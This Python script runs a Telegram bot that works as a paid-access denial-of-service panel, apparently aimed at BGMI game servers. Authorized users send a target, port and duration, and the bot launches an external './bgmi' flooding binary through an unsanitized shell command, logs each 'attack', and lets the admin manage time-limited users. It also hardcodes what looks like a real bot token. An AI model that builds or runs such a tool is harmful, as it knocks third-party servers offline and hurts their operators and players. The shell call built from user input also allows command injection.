#!/usr/bin/python3
# 𝐉𝐚𝐢 𝐒𝐡𝐫𝐞𝐞 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 ❤️

import telebot
import subprocess
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7190337181:AAGw3i1sgmXOgHHFNyg7U-L0gBpJPElRV74')

# Admin user IDs
admin_id = ["5448980180"]

# File to store allowed user IDs with expiration timestamps
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs and their expiration times from the file
def read_users():
    users = {}
    try:
        with open(USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                user_id, expiration_timestamp = line.split()
                expiration_time = datetime.datetime.fromtimestamp(float(expiration_timestamp))
                users[user_id] = expiration_time
    except FileNotFoundError:
        pass
    return users

# Dictionary to store allowed user IDs and their expiration times
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Add user with an expiration time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_hours = int(command[2])
            expiration_time = datetime.datetime.now() + datetime.timedelta(hours=duration_hours)
            expiration_timestamp = expiration_time.timestamp()

            if user_to_add not in allowed_user_ids:
                allowed_user_ids[user_to_add] = expiration_time
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add} {expiration_timestamp}\n")
                response = f"User {user_to_add} added successfully for {duration_hours} hours."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID and duration in hours to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

# Remove user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                del allowed_user_ids[user_to_remove]
                with open(USER_FILE, "w") as file:
                    for user_id, expiration_time in allowed_user_ids.items():
                        file.write(f"{user_id} {expiration_time.timestamp()}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

# Clear logs
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

# Show all authorized users
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for line in user_ids:
                        user_id, expiration_timestamp = line.split()
                        expiration_time = datetime.datetime.fromtimestamp(float(expiration_timestamp))
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id}) - Expires at: {expiration_time}\n"
                        except Exception as e:
                            response += f"- User ID: {user_id} - Expires at: {expiration_time}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

# Show recent logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)

# Show user ID
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n𝐉𝐚𝐢 𝐒𝐡𝐫𝐞𝐞 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 ❤️"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 40  # Cooldown time in seconds

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    current_time = datetime.datetime.now()

    if user_id in allowed_user_ids and allowed_user_ids[user_id] > current_time:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (current_time - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown. Please Wait 40 Sec. Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = current_time
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 120:
                response = "Error: Time interval must be less than 120."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "Usage :- /bgmi <target> <port> <time>\n𝐉𝐚𝐢 𝐒𝐡𝐫𝐞𝐞 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 ❤️"
    else:
        response = "You Are Not Authorized To Use This Command or Your Authorization Has Expired.\n𝐉𝐚𝐢 𝐒𝐡𝐫𝐞𝐞 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 ❤️"

    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids and allowed_user_ids[user_id] > datetime.datetime.now():
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command or Your Authorization Has Expired."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /bgmi : Method For Bgmi Servers.
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /admincmd : Shows All Admin Commands.
 𝐉𝐚𝐢 𝐒𝐡𝐫𝐞𝐞 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 ❤️
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome, {user_name}!\nJust Run The Fckn Bot\nSee Commands : /help\n𝐉𝐚𝐢 𝐒𝐡𝐫𝐞𝐞 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 ❤️"
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. There Is No Rule
𝐉𝐚𝐢 𝐒𝐡𝐫𝐞𝐞 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 ❤️'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, It`s Free
𝐉𝐚𝐢 𝐒𝐡𝐫𝐞𝐞 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 ❤️
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> <duration_in_hours> : Add a User for a specific duration.
/remove <userId> : Remove a User.
/allusers : Authorized Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
𝐉𝐚𝐢 𝐒𝐡𝐫𝐞𝐞 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 ❤️
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for line in user_ids:
                    user_id, _ = line.split()
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

bot.polling()
# 𝐉𝐚𝐢 𝐒𝐡𝐫𝐞𝐞 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 ❤️